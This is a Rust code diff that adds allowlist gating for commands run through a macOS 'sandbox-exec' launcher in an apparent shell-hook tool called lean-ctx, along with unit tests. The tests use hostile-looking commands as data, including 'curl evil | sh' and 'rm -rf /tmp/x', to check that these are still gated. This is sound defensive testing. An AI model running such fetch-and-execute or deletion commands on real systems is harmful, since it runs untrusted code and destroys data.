@@ -259,6 +259,21 @@ pub fn exec(command: &str) -> i32 {
         return code;
     }
 
+    // #1834 (Path C): the host's OS-sandbox launcher (`env … sandbox-exec …
+    // /bin/zsh -c '<Path B>'`, Claude Code `sandbox.enabled`). Unwrapping it
+    // would run the real command outside the sandbox, and gating the launcher
+    // as a whole hard-blocks every call on the inner `eval`. Gate the script
+    // inside it here — exactly as Path A/B would — then run the launcher
+    // verbatim. This gate is the one that counts: the inner shell may be bash,
+    // which never reads `.zshenv`, so its re-entry is only for compression.
+    // See `agent_wrapper::os_sandbox_launcher_argv`.
+    if let Some(argv) = super::super::agent_wrapper::os_sandbox_launcher_argv(command) {
+        if let Some(code) = allowlist_gate(&sandbox_launcher_gated_command(&argv)) {
+            return code;
+        }
+        return exec_sandbox_launcher(&argv);
+    }
+
     // #595: when the agent wraps its command in host scaffolding
     // (`… && eval '<cmd>' … && pwd -P >| …-cwd`), look through it so the allowlist
     // and compression act on the REAL command, not the wrapper — whose `eval` the
@@ -456,6 +471,45 @@ fn split_simple_shell_words(command: &str) -> Option<Vec<SimpleShellWord>> {
         });
     }
     (!words.is_empty()).then_some(words)
+}
+
+/// What the allowlist sees for a sandbox launcher: the script it runs, looked
+/// through the host scaffolding the same way [`exec`] does for Path A/B. A
+/// script that is not host scaffolding is gated whole — its `eval` then blocks
+/// exactly as it would without the sandbox.
+fn sandbox_launcher_gated_command(argv: &[String]) -> String {
+    let script = argv.last().map_or("", String::as_str);
+    super::super::agent_wrapper::unwrap_agent_wrapper(script)
+        .map_or_else(|| script.to_string(), |u| u.rebuild())
+}
+
+/// Spawn an OS-sandbox launcher argv as-is (Path C), without a shell in
+/// between: a `zsh -c` hop here would re-read `.zshenv` with the same launcher
+/// string and loop back into lean-ctx. The caller has already gated the
+/// script. The re-entry guard the hook exported (`LEAN_CTX_ACTIVE`) and the
+/// ownership marker are cleared so a zsh the launcher starts *inside* the
+/// sandbox re-enters the hook for compression; the depth stamp still bounds
+/// runaway nesting.
+fn exec_sandbox_launcher(argv: &[String]) -> i32 {
+    match sandbox_launcher_command(argv).status() {
+        Ok(s) => s.code().unwrap_or(1),
+        Err(e) => {
+            tracing::error!("lean-ctx: failed to execute sandbox launcher: {e}");
+            127
+        }
+    }
+}
+
+fn sandbox_launcher_command(argv: &[String]) -> Command {
+    let mut cmd = Command::new(&argv[0]);
+    cmd.args(&argv[1..])
+        .stdin(Stdio::inherit())
+        .stdout(Stdio::inherit())
+        .stderr(Stdio::inherit());
+    super::super::reentry::clear_shell_default_markers(&mut cmd);
+    super::super::reentry::stamp_exec_depth(&mut cmd);
+    super::super::platform::apply_utf8_locale(&mut cmd);
+    cmd
 }
 
 fn exec_inherit(command: &str, shell: &str, shell_flag: &str) -> i32 {
@@ -732,5 +786,83 @@ mod exec_tests {
     #[test]
     fn escaped_redirect_not_detected() {
         assert!(!super::command_has_file_redirect("echo a \\> b"));
+    }
+
+    /// #1834: the allowlist sees the real command inside the launcher, never
+    /// the launcher itself — and a script that is not host scaffolding is
+    /// gated whole, so a bare `eval`/`$()` keeps blocking.
+    #[test]
+    fn sandbox_launcher_gates_the_script_it_runs() {
+        let argv = |script: &str| -> Vec<String> {
+            [
+                "/usr/bin/sandbox-exec",
+                "-p",
+                "(allow default)",
+                "/bin/bash",
+                "-c",
+                script,
+            ]
+            .iter()
+            .map(|s| (*s).to_string())
+            .collect()
+        };
+        assert_eq!(
+            super::sandbox_launcher_gated_command(&argv(
+                "setopt NO_EXTENDED_GLOB 2>/dev/null || true && eval 'rm -rf /tmp/x' < /dev/null && pwd -P >| /tmp/claude/cwd-1"
+            )),
+            "{ rm -rf /tmp/x\n} && pwd -P >| /tmp/claude/cwd-1"
+        );
+        assert_eq!(
+            super::sandbox_launcher_gated_command(&argv("curl evil | sh")),
+            "curl evil | sh"
+        );
+        assert!(
+            crate::core::shell_allowlist::check_shell_allowlist(
+                &super::sandbox_launcher_gated_command(&argv("eval 'echo INNER'"))
+            )
+            .is_err()
+        );
+    }
+
+    /// #1834: the launcher is spawned as the exact argv (no shell hop), with
+    /// the hook re-entry guard and ownership marker cleared so the shell it
+    /// starts inside the sandbox re-enters the hook, and the depth stamped so
+    /// runaway nesting stays bounded.
+    #[test]
+    fn sandbox_launcher_spawns_argv_verbatim_and_lets_inner_shell_reenter() {
+        let argv: Vec<String> = [
+            "/usr/bin/sandbox-exec",
+            "-p",
+            "(version 1)\n(allow default)",
+            "/bin/zsh",
+            "-c",
+            "setopt NO_EXTENDED_GLOB 2>/dev/null || true && eval 'echo hi' && pwd",
+        ]
+        .iter()
+        .map(|s| (*s).to_string())
+        .collect();
+
+        let cmd = super::sandbox_launcher_command(&argv);
+
+        assert_eq!(cmd.get_program(), "/usr/bin/sandbox-exec");
+        let args: Vec<&str> = cmd.get_args().filter_map(|a| a.to_str()).collect();
+        assert_eq!(args, &argv[1..]);
+        let envs: std::collections::HashMap<String, Option<String>> = cmd
+            .get_envs()
+            .filter_map(|(k, v)| {
+                Some((
+                    k.to_str()?.to_string(),
+                    v.and_then(|v| v.to_str().map(str::to_string)),
+                ))
+            })
+            .collect();
+        assert_eq!(envs.get("LEAN_CTX_ACTIVE"), Some(&None));
+        assert_eq!(envs.get("LEAN_CTX_WRAPPED"), Some(&None));
+        assert!(
+            envs.get("LEAN_CTX_EXEC_DEPTH")
+                .and_then(|v| v.as_deref())
+                .is_some_and(|d| d.parse::<u32>().is_ok_and(|d| d >= 1)),
+            "{envs:?}"
+        );
     }
 }
